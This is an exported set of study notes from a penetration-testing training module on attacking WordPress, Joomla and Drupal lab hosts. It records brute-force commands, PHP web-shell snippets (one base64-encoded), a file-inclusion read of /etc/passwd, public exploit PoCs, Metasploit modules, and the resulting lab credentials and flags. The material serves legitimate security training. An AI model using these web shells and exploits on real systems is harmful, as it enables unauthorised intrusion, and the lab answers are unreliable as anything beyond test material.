---
tags: [CWES, XMind, output, xmind-output]
source_file: CWES.xmind
source_sheet: "2"
module: "Attacking Common Applications"
output_topics: 50
---

# Attacking Common Applications — Outputs 001–050

> [!info] Yellow XMind topic semantics
> The author uses yellow topics to represent **outputs**. Every entry below corresponds to one yellow source topic and retains its XMind topic ID in a hidden validation marker.

Return to [[Outputs/Modules/Attacking Common Applications Outputs|Attacking Common Applications output index]].

## Outputs

> [!output]+ 🟨 Output 001
> 10.129.42.195	app.inlanefreight.local dev.inlanefreight.local blog.inlanefreight.local
>
> **Source path:** Attacking Common Applications → Part 1 → Introduction to Attacking Common Applications → Module Targets → make manual entries in our /etc/hosts → $ printf "%s\t%s\n\n" "$IP" "app.inlanefreight.local dev.inlanefreight.local blog.inlanefreight.local" | sudo tee -a /etc/hosts → cat /etc/hosts → 10.129.42.195	app.inlanefreight.local dev.inlanefreight.local blog.inlanefreight.local
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: f8e8a3d2-7539-4d3a-9bff-d9f33f158670 -->

> [!output]+ 🟨 Output 002
> ew.db
>
> **Source path:** Attacking Common Applications → Part 1 → Application Discovery &amp; Enumeration → LAB → Use what you've learned from this section to generate a report with EyeWitness. What is the name of the .db file EyeWitness creates in the inlanefreight_eyewitness folder? (Format: filename.db) → ls *.db → ew.db
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: b7faac91-c090-4153-ad42-a2dccbb867e5 -->

> [!output]+ 🟨 Output 003
> Pages by Similarity
>
> **Source path:** Attacking Common Applications → Part 1 → Application Discovery &amp; Enumeration → LAB → What does the header on the title page say when opening the aquatone_report.html page with a web browser? (Format: 3 words, case sensitive) → firefox aquatone_report.html → Pages by Similarity
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 896029e5-73e5-4add-958b-8f7c8f486879 -->

> [!output]+ 🟨 Output 004
> Contact Form 7 and mail-masta plugins are installed
>
> **Source path:** Attacking Common Applications → Part 1 → WordPress - Discovery &amp; Enumeration → Enumeration → looking at the page source → curl -s http://blog.inlanefreight.local/ | grep plugins → Contact Form 7 and mail-masta plugins are installed
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 8278f297-72f9-4d40-be44-a3a4ce85259d -->

> [!output]+ 🟨 Output 005
> [+] Upload directory has listing enabled: http://blog.inlanefreight.local/wp-content/uploads/
>
> **Source path:** Attacking Common Applications → Part 1 → WordPress - Discovery &amp; Enumeration → LAB → Enumerate the host and find a flag.txt flag in an accessible directory. → wpscan --url blog.inlanefreight.local --enumerate → [+] Upload directory has listing enabled: http://blog.inlanefreight.local/wp-content/uploads/
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 8d65a267-825e-4ee7-9be7-d5304f83aeb4 -->

> [!output]+ 🟨 Output 006
> 0ptions_ind3xeS_ftw!
>
> **Source path:** Attacking Common Applications → Part 1 → WordPress - Discovery &amp; Enumeration → LAB → Enumerate the host and find a flag.txt flag in an accessible directory. → wpscan --url blog.inlanefreight.local --enumerate → [+] Upload directory has listing enabled: http://blog.inlanefreight.local/wp-content/uploads/ → 0ptions_ind3xeS_ftw!
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 4bc5396d-fb13-44d1-94fe-86342fb60fb0 -->

> [!output]+ 🟨 Output 007
> WP Sitemap Page
>
> **Source path:** Attacking Common Applications → Part 1 → WordPress - Discovery &amp; Enumeration → LAB → Perform manual enumeration to discover another installed plugin. Submit the plugin name as the answer (3 words). → visit http://blog.inlanefreight.local/?p=1 → WP Sitemap Page
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 9f09012d-81b1-45a9-b643-d5b1ff561515 -->

> [!output]+ 🟨 Output 008
> Stable tag: 1.6.4
>
> **Source path:** Attacking Common Applications → Part 1 → WordPress - Discovery &amp; Enumeration → LAB → Find the version number of this plugin. (i.e., 4.5.2) → visit reademe.txt → http://blog.inlanefreight.local/wp-content/plugins/wp-sitemap-page/readme.txt → Stable tag: 1.6.4
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 7672226d-8c4a-4ca3-bbd3-7ee28d129fd5 -->

> [!output]+ 🟨 Output 009
> Username: john, Password: firebird1
>
> **Source path:** Attacking Common Applications → Part 1 → Attacking WordPress → Login → Login Bruteforce → through /xmlrpc.php → sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local → Username: john, Password: firebird1
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 66b9e125-2be6-44e1-a057-fb1ac2a7bf55 -->

> [!output]+ 🟨 Output 010
> uid=33(www-data) gid=33(www-data) groups=33(www-data)
>
> **Source path:** Attacking Common Applications → Part 1 → Attacking WordPress → Login → Code Execution → curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id → uid=33(www-data) gid=33(www-data) groups=33(www-data)
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 744cde87-7455-44ea-aeb0-54d4565f00cc -->

> [!output]+ 🟨 Output 011
> www-data (33)
>
> **Source path:** Attacking Common Applications → Part 1 → Attacking WordPress → Login → Code Execution → Metasploit → use exploit/unix/webapp/wp_admin_shell_upload → exploit → getuid → www-data (33)
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: d82fe2f1-949a-44b4-8cd8-90c3bf6aec95 -->

> [!output]+ 🟨 Output 012
> root:x:...
>
> **Source path:** Attacking Common Applications → Part 1 → Attacking WordPress → Leveraging Known Vulnerabilities → Vulnerable Plugins - mail-masta → Let's exploit this to retrieve the contents of the /etc/passwd file using cURL → curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd → root:x:...
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: b3668cfb-236c-41ca-834c-84f3b697ee70 -->

> [!output]+ 🟨 Output 013
> [+] Upload Success...
>
> **Source path:** Attacking Common Applications → Part 1 → Attacking WordPress → Leveraging Known Vulnerabilities → Vulnerable Plugins - wpDiscuz → https://www.exploit-db.com/exploits/49967 → python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1 → [+] Upload Success...
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 9b04b117-d7f0-49d8-8616-ce2153aac9a8 -->

> [!output]+ 🟨 Output 014
> Webshell path:url&amp;quot;:&amp;quot;http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php&amp;quot;
>
> **Source path:** Attacking Common Applications → Part 1 → Attacking WordPress → Leveraging Known Vulnerabilities → Vulnerable Plugins - wpDiscuz → https://www.exploit-db.com/exploits/49967 → python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1 → [+] Upload Success... → Webshell path:url&amp;quot;:&amp;quot;http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php&amp;quot;
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 7e6e94f7-04df-4609-96c1-f4651434d5a7 -->

> [!output]+ 🟨 Output 015
> [x] Failed to execute PHP code...
>
> **Source path:** Attacking Common Applications → Part 1 → Attacking WordPress → Leveraging Known Vulnerabilities → Vulnerable Plugins - wpDiscuz → https://www.exploit-db.com/exploits/49967 → python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1 → id → [x] Failed to execute PHP code...
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 7be5dffc-c0d0-443b-b9d9-e25de7b769f9 -->

> [!output]+ 🟨 Output 016
> GIF689a;
>
> uid=33(www-data) gid=33(www-data) groups=33(www-data)
>
> **Source path:** Attacking Common Applications → Part 1 → Attacking WordPress → Leveraging Known Vulnerabilities → Vulnerable Plugins - wpDiscuz → https://www.exploit-db.com/exploits/49967 → curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id → GIF689a;    uid=33(www-data) gid=33(www-data) groups=33(www-data)
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 32719fe4-55d5-4e61-a57c-9ae89ecfab9f -->

> [!output]+ 🟨 Output 017
> [i] User(s) Identified:
> [+] admin
> ...
> [+] doug
>
> **Source path:** Attacking Common Applications → Part 1 → Attacking WordPress → LAB → Perform user enumeration against http://blog.inlanefreight.local. Aside from admin, what is the other user present? → wpscan --url blog.inlanefreight.local --enumerate → [i] User(s) Identified: [+] admin ... [+] doug
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 7bb2adaa-e3a2-45b7-bf35-82c5b3ae90a7 -->

> [!output]+ 🟨 Output 018
> Username: doug, Password: jessica1
>
> **Source path:** Attacking Common Applications → Part 1 → Attacking WordPress → LAB → Perform a login bruteforcing attack against the discovered user. Submit the user's password as the answer. → gunzip rockyou.txt.gz → sudo wpscan --password-attack xmlrpc -t 20 -U doug -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local → Username: doug, Password: jessica1
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: d5e4105b-d2d9-4a8e-8c98-de30ed2cd6f3 -->

> [!output]+ 🟨 Output 019
> app.inlanefreight.local
> blog.inlanefreight.local
> dev.inlanefreight.local
> drupal-acc.inlanefreight.local
> drupal-dev.inlanefreight.local
> drupal-qa.inlanefreight.local
> drupal.inlanefreight.local
> html
>
> **Source path:** Attacking Common Applications → Part 1 → Attacking WordPress → LAB → Following the steps in this section, obtain code execution on the host and submit the contents of the flag.txt file in the webroot. → curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=ls+/var/www/ → app.inlanefreight.local blog.inlanefreight.local dev.inlanefreight.local drupal-acc.inlanefreight.local drupal-dev.inlanefreight.local drupal-qa.inlanefreight.local drupal.inlanefreight.local html
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 7f8fe4b1-93ef-4ff7-b789-23b437c0cde3 -->

> [!output]+ 🟨 Output 020
> flag_d8e8fca2dc0f896fd7cb4cb0031ba249.txt
>
> **Source path:** Attacking Common Applications → Part 1 → Attacking WordPress → LAB → Following the steps in this section, obtain code execution on the host and submit the contents of the flag.txt file in the webroot. → curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=ls+/var/www/ → app.inlanefreight.local blog.inlanefreight.local dev.inlanefreight.local drupal-acc.inlanefreight.local drupal-dev.inlanefreight.local drupal-qa.inlanefreight.local drupal.inlanefreight.local html → curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=ls+/var/www/blog.inlanefreight.local → flag_d8e8fca2dc0f896fd7cb4cb0031ba249.txt
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 9f7c9300-de94-4f1d-8ad8-912f77806f69 -->

> [!output]+ 🟨 Output 021
> l00k_ma_unAuth_rc3!
>
> **Source path:** Attacking Common Applications → Part 1 → Attacking WordPress → LAB → Following the steps in this section, obtain code execution on the host and submit the contents of the flag.txt file in the webroot. → curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=ls+/var/www/ → app.inlanefreight.local blog.inlanefreight.local dev.inlanefreight.local drupal-acc.inlanefreight.local drupal-dev.inlanefreight.local drupal-qa.inlanefreight.local drupal.inlanefreight.local html → curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=ls+/var/www/blog.inlanefreight.local → flag_d8e8fca2dc0f896fd7cb4cb0031ba249.txt → curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=cat+/var/www/blog.inlanefreight.local/flag_d8e8fca2dc0f896fd7cb4cb0031ba249.txt → l00k_ma_unAuth_rc3!
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: bbb8e2b1-7072-4c63-a8e4-163bc442d6d3 -->

> [!output]+ 🟨 Output 022
> * This is a Joomla! installation/upgrade package to version 3.x
>
> **Source path:** Attacking Common Applications → Part 1 → Joomla - Discovery &amp; Enumeration → Discovery/Footprinting → version if the README.txt file is present → curl -s http://dev.inlanefreight.local/README.txt | head -n 5 → * This is a Joomla! installation/upgrade package to version 3.x
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 67d85a18-4b28-4851-ac66-d82ee14163dc -->

> [!output]+ 🟨 Output 023
> &lt;version&gt;3.9.4&lt;/version&gt;
>
> **Source path:** Attacking Common Applications → Part 1 → Joomla - Discovery &amp; Enumeration → Discovery/Footprinting → browsing to administrator/manifests/files/joomla.xml. → curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format - → &lt;version&gt;3.9.4&lt;/version&gt;
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 23b3537e-b478-4dff-851c-c5fd8ec3ec31 -->

> [!output]+ 🟨 Output 024
> [+] Possible version(s):                                                        
>     3.8.10
>     3.8.11
> [+] Possible interesting urls found:
>     Detailed version information. - http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml
>
> **Source path:** Attacking Common Applications → Part 1 → Joomla - Discovery &amp; Enumeration → Enumeration → droopescan → droopescan scan joomla --url http://dev.inlanefreight.local/ → [+] Possible version(s):                                                             3.8.10     3.8.11 [+] Possible interesting urls found:     Detailed version information. - http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: cfabc1e5-38e7-4981-9859-2efe77b46c1d -->

> [!output]+ 🟨 Output 025
> admin:admin
>
> **Source path:** Attacking Common Applications → Part 1 → Joomla - Discovery &amp; Enumeration → Enumeration → default user: admin but no default password → attempt to brute force the login. → joomla-bruteforce → https://github.com/ajnik/joomla-bruteforce → sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin → admin:admin
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 0d4b55d2-ac4a-49e8-a5b6-45fffd30a1f2 -->

> [!output]+ 🟨 Output 026
> &lt;version&gt;3.10.0&lt;/version&gt;
>
> **Source path:** Attacking Common Applications → Part 1 → Joomla - Discovery &amp; Enumeration → LAB → Fingerprint the Joomla version in use on http://app.inlanefreight.local (Format: x.x.x) → #echo '10.129.42.195 app.inlanefreight.local' &gt;&gt; /etc/hosts → curl -s http://app.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format - → &lt;version&gt;3.10.0&lt;/version&gt;
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 612c7aab-70fc-45c1-8299-cfcea5e985bb -->

> [!output]+ 🟨 Output 027
> admin:turnkey
>
> **Source path:** Attacking Common Applications → Part 1 → Joomla - Discovery &amp; Enumeration → LAB → Find the password for the admin user on http://app.inlanefreight.local → git clone https://github.com/ajnik/joomla-bruteforce.git → sudo python3 joomla-brute.py -u http://app.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin → admin:turnkey
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 796cfdb3-8b47-46c0-9ee4-95579b5ad2bb -->

> [!output]+ 🟨 Output 028
> uid=33(www-data) gid=33(www-data) groups=33(www-data)
>
> **Source path:** Attacking Common Applications → Part 1 → Attacking Joomla → Abusing Built-In Functionality → Using the credentials that we obtained → gain RCE → curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id → uid=33(www-data) gid=33(www-data) groups=33(www-data)
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 834d643b-898c-4fad-b6b4-be913d801ce9 -->

> [!output]+ 🟨 Output 029
> index.php
> robots.txt
> web.config.txt
>
> **Source path:** Attacking Common Applications → Part 1 → Attacking Joomla → Leveraging Known Vulnerabilities → 3.9.4 was released in March of 2019. Though it is out of date → this version of Joomla is likely vulnerable to CVE-2019-10945 → exploit script → https://www.exploit-db.com/exploits/46710 → python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir / → index.php  robots.txt  web.config.txt
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 468cecad-2846-4984-aef4-765fdc28929b -->

> [!output]+ 🟨 Output 030
> flag_6470e394cbf6dab6a91682cc8585059b.txt
>
> **Source path:** Attacking Common Applications → Part 1 → Attacking Joomla → LAB → Leverage the directory traversal vulnerability to find a flag in the web root of the http://dev.inlanefreight.local/ Joomla application → git clone https://github.com/dpgg101/CVE-2019-10945.git → python CVE-2019-10945.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir / → flag_6470e394cbf6dab6a91682cc8585059b.txt
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: b5ae973c-b82d-4713-b890-98c4cf361cb2 -->

> [!output]+ 🟨 Output 031
> j00mla_c0re_d1rtrav3rsal!
>
> **Source path:** Attacking Common Applications → Part 1 → Attacking Joomla → LAB → Leverage the directory traversal vulnerability to find a flag in the web root of the http://dev.inlanefreight.local/ Joomla application → git clone https://github.com/dpgg101/CVE-2019-10945.git → python CVE-2019-10945.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir / → flag_6470e394cbf6dab6a91682cc8585059b.txt → curl http:/dev.inlanefreight.local/flag_6470e394cbf6dab6a91682cc8585059b.txt → j00mla_c0re_d1rtrav3rsal!
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 16fb469b-fc72-45fe-aa12-29ebe95b232f -->

> [!output]+ 🟨 Output 032
> &lt;span&gt;Powered by &lt;a href="https://www.drupal.org"&gt;Drupal&lt;/a&gt;&lt;/span&gt;
>
> **Source path:** Attacking Common Applications → Part 1 → Drupal - Discovery &amp; Enumeration → Discovery/Footprinting → curl -s http://drupal.inlanefreight.local | grep Drupal → &lt;span&gt;Powered by &lt;a href="https://www.drupal.org"&gt;Drupal&lt;/a&gt;&lt;/span&gt;
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 244b92b1-f058-4a5d-9ad9-7c76c1cdb8a8 -->

> [!output]+ 🟨 Output 033
> Drupal 7.57, 2018-02-21
>
> **Source path:** Attacking Common Applications → Part 1 → Drupal - Discovery &amp; Enumeration → Enumeration → version number → curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 "" → Drupal 7.57, 2018-02-21
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: d4c6c8ec-08ac-45aa-a1ba-a90d8e1a7f11 -->

> [!output]+ 🟨 Output 034
> [+] Plugins found
>
> **Source path:** Attacking Common Applications → Part 1 → Drupal - Discovery &amp; Enumeration → Enumeration → version number → droopescan → droopescan scan drupal -u http://drupal.inlanefreight.local → [+] Plugins found
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 3ce12549-02c9-44e8-8042-24c694b385fe -->

> [!output]+ 🟨 Output 035
> [+] Possible version(s):
>     8.9.0
>     8.9.1
>
> **Source path:** Attacking Common Applications → Part 1 → Drupal - Discovery &amp; Enumeration → Enumeration → version number → droopescan → droopescan scan drupal -u http://drupal.inlanefreight.local → [+] Possible version(s):      8.9.0      8.9.1
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: a9a69b34-26d4-4f25-bd76-b9fc81e7c66f -->

> [!output]+ 🟨 Output 036
> [+] Possible interesting urls found:
>     Default admin - http://drupal.inlanefreight.local/user/login
>
> **Source path:** Attacking Common Applications → Part 1 → Drupal - Discovery &amp; Enumeration → Enumeration → version number → droopescan → droopescan scan drupal -u http://drupal.inlanefreight.local → [+] Possible interesting urls found:      Default admin - http://drupal.inlanefreight.local/user/login
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 39009b3f-6663-492e-b048-8b5982541c71 -->

> [!output]+ 🟨 Output 037
> Drupal 7.30, 2014-07-24
>
> **Source path:** Attacking Common Applications → Part 1 → Drupal - Discovery &amp; Enumeration → LAB → Identify the Drupal version number in use on http://drupal-qa.inlanefreight.local → curl -s http://drupal-qa.inlanefreight.local/CHANGELOG.txt | grep -m2 "" → Drupal 7.30, 2014-07-24
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 09a57cc3-0793-4090-8528-2ca1f639ae79 -->

> [!output]+ 🟨 Output 038
> uid=33(www-data) gid=33(www-data) groups=33(www-data)
>
> **Source path:** Attacking Common Applications → Part 1 → Attacking Drupal → Leveraging the PHP Filter Module → older versions of Drupal (before version 8) → it was possible to log in as an admin and enable the PHP filter → http://drupal-qa.inlanefreight.local/#overlay=admin/modules → tick the check box next to the module and scroll down to Save configuration. → Content --&gt; Add content and create a Basic page. → malicious PHP snippet → &lt;?php  system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);  ?&gt; → set Text format drop-down to PHP code → redirected to the new page → http://drupal-qa.inlanefreight.local/node/3 → curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d"&gt;" → uid=33(www-data) gid=33(www-data) groups=33(www-data)
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 389c44d4-a54c-46e8-8f2b-07468e9d55b6 -->

> [!output]+ 🟨 Output 039
> uid=33(www-data) gid=33(www-data) groups=33(www-data)
>
> **Source path:** Attacking Common Applications → Part 1 → Attacking Drupal → Uploading a Backdoored Module → Once the installation succeeds → browse to /modules/captcha/shell.php → curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id → uid=33(www-data) gid=33(www-data) groups=33(www-data)
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: a17e9f80-ca7c-4cc9-85b3-9cef65a9f5bb -->

> [!output]+ 🟨 Output 040
> [!] Administrator user created!
>
> **Source path:** Attacking Common Applications → Part 1 → Attacking Drupal → Leveraging Known Vulnerabilities → Drupalgeddon → pre-authentication SQL injection → adding a new admin user with this PoC script → python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd → [!] Administrator user created!
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 9c9c0e50-0d80-4e37-aaeb-c0ece83e8ab4 -->

> [!output]+ 🟨 Output 041
> Check: http://drupal-dev.inlanefreight.local/hello.txt
>
> **Source path:** Attacking Common Applications → Part 1 → Attacking Drupal → Leveraging Known Vulnerabilities → Drupalgeddon2 → PoC → https://www.exploit-db.com/exploits/44448 → python3 drupalgeddon2.py → Check: http://drupal-dev.inlanefreight.local/hello.txt
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 98b055d1-1c2e-4f63-a20a-84980c33be3b -->

> [!output]+ 🟨 Output 042
> ;-)
>
> **Source path:** Attacking Common Applications → Part 1 → Attacking Drupal → Leveraging Known Vulnerabilities → Drupalgeddon2 → PoC → https://www.exploit-db.com/exploits/44448 → python3 drupalgeddon2.py → curl -s http://drupal-dev.inlanefreight.local/hello.txt → ;-)
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 211b3638-50db-4170-8ae1-7b9de5698230 -->

> [!output]+ 🟨 Output 043
> PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K
>
> **Source path:** Attacking Common Applications → Part 1 → Attacking Drupal → Leveraging Known Vulnerabilities → Drupalgeddon2 → PoC → https://www.exploit-db.com/exploits/44448 → Now let's modify the script to gain remote code execution by uploading a malicious PHP file. → echo '&lt;?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?&gt;' | base64 → PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 1f2553fd-76de-493c-9609-a67dd16a46a5 -->

> [!output]+ 🟨 Output 044
> Check: http://drupal-dev.inlanefreight.local/mrb3n.php
>
> **Source path:** Attacking Common Applications → Part 1 → Attacking Drupal → Leveraging Known Vulnerabilities → Drupalgeddon2 → PoC → https://www.exploit-db.com/exploits/44448 → Now let's modify the script to gain remote code execution by uploading a malicious PHP file. → echo '&lt;?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?&gt;' | base64 → PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K → echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php → python3 drupalgeddon2.py → Check: http://drupal-dev.inlanefreight.local/mrb3n.php
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: cd7f5b22-ef82-4cab-8053-62268c75957b -->

> [!output]+ 🟨 Output 045
> uid=33(www-data) gid=33(www-data) groups=33(www-data)
>
> **Source path:** Attacking Common Applications → Part 1 → Attacking Drupal → Leveraging Known Vulnerabilities → Drupalgeddon2 → PoC → https://www.exploit-db.com/exploits/44448 → Now let's modify the script to gain remote code execution by uploading a malicious PHP file. → echo '&lt;?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?&gt;' | base64 → PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K → echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php → python3 drupalgeddon2.py → Check: http://drupal-dev.inlanefreight.local/mrb3n.php → curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id → uid=33(www-data) gid=33(www-data) groups=33(www-data)
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 0b3f4829-40c8-44b5-b1d2-dc7fe350a358 -->

> [!output]+ 🟨 Output 046
> meterpreter &gt;
>
> **Source path:** Attacking Common Applications → Part 1 → Attacking Drupal → Leveraging Known Vulnerabilities → Drupalgeddon3 → authenticated remote code execution vulnerability → We can exploit this using Metasploit → exploit/multi/http/drupal_drupageddon3 → exploit → meterpreter &gt;
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: df805fdd-0648-45af-827c-efcca7eb5fd2 -->

> [!output]+ 🟨 Output 047
> www-data (33)
>
> **Source path:** Attacking Common Applications → Part 1 → Attacking Drupal → Leveraging Known Vulnerabilities → Drupalgeddon3 → authenticated remote code execution vulnerability → We can exploit this using Metasploit → exploit/multi/http/drupal_drupageddon3 → exploit → meterpreter &gt; → getuid → www-data (33)
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 53c82289-6605-4dbe-9449-41c916b8fb21 -->

> [!output]+ 🟨 Output 048
> Meterpreter &gt;
>
> **Source path:** Attacking Common Applications → Part 1 → Attacking Drupal → Leveraging Known Vulnerabilities → LAB → Work through all of the examples in this section and gain RCE multiple ways via the various Drupal instances on the target host. When you are done, submit the contents of the flag.txt file in the /var/www/drupal.inlanefreight.local directory. → exploit(unix/webapp/drupal_drupalgeddon2 → run → Meterpreter &gt;
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 5ac2b13b-6daf-47ba-9813-b9a7ccdfb632 -->

> [!output]+ 🟨 Output 049
> flag_6470e394cbf6dab6a91682cc8585059b.txt
>
> **Source path:** Attacking Common Applications → Part 1 → Attacking Drupal → Leveraging Known Vulnerabilities → LAB → Work through all of the examples in this section and gain RCE multiple ways via the various Drupal instances on the target host. When you are done, submit the contents of the flag.txt file in the /var/www/drupal.inlanefreight.local directory. → exploit(unix/webapp/drupal_drupalgeddon2 → run → Meterpreter &gt; → ls /var/www/drupal.inlanefreight.local → flag_6470e394cbf6dab6a91682cc8585059b.txt
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 0db35863-1415-4a77-b492-1b0a823e02cc -->

> [!output]+ 🟨 Output 050
> DrUp@l_drUp@l_3veryWh3Re!
>
> **Source path:** Attacking Common Applications → Part 1 → Attacking Drupal → Leveraging Known Vulnerabilities → LAB → Work through all of the examples in this section and gain RCE multiple ways via the various Drupal instances on the target host. When you are done, submit the contents of the flag.txt file in the /var/www/drupal.inlanefreight.local directory. → exploit(unix/webapp/drupal_drupalgeddon2 → run → Meterpreter &gt; → ls /var/www/drupal.inlanefreight.local → flag_6470e394cbf6dab6a91682cc8585059b.txt → cat → DrUp@l_drUp@l_3veryWh3Re!
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 2f561873-1b2d-46c2-9275-fce72aa254e7 -->
